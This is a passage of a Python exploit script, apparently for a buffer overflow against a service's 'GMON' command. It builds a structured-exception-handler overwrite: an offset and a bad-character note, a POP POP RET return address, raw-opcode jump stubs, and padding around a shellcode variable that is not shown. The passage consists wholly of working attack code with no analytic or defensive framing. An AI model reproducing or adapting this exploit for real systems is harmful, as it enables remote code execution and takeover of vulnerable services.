...
# SEH overwrite at 3515
# Bad char - \x00
# 0x625010B4 - POP POP RET

pop1 = "\x58\x58\xEB\x04" # POP EAX; POP EAX; JMP 04
pop2 = "\x58\x80\xec\x05\xff\xe0" # POP EAX; SUB AH,05; JMP EAX
payload = "A"*(3515-1004) + shellcode + "B"*(1004-len(shellcode)) + pop1 + "\xB4\x10\x50\x62" + pop2
payload += "D"*(5000-len(payload))

print("Payload length: " + str(len(payload)))
buffer1 = "GMON /.:/" + payload
